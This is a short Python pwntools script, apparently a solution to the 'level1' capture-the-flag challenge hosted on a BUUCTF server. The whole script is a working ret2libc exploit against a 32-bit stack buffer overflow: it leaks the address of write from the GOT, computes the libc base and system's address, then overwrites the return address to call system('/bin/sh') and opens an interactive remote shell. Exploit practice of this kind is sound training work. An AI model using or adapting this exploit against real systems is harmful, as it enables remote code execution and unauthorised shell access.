from pwn import *

# r = process(r'./level1')
r = remote(r'node5.buuoj.cn', 25656)
elf = ELF('./level1')
libc = ELF(r'./libc/libc-2.23_32.so')

context.arch = 'i386'
context.log_level = 'debug'

write_plt = elf.plt['write']
write_got = elf.got['write']
main_addr = elf.symbols['main']

payload = b'A' * (0x88 + 4) + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(0x4)

r.sendline(payload)
# r.recvuntil(b'this:')
write_addr = u32(r.recv(4))
print(hex(write_addr))

base_addr = write_addr - libc.sym['write']
system_addr = base_addr + libc.sym['system']
sh_addr = base_addr + libc.search(b'/bin/sh').__next__()

payload2 = b'A' * (0x88 + 4) + p32(system_addr) + p32(0) + p32(sh_addr)
r.sendline(payload2)
r.interactive()
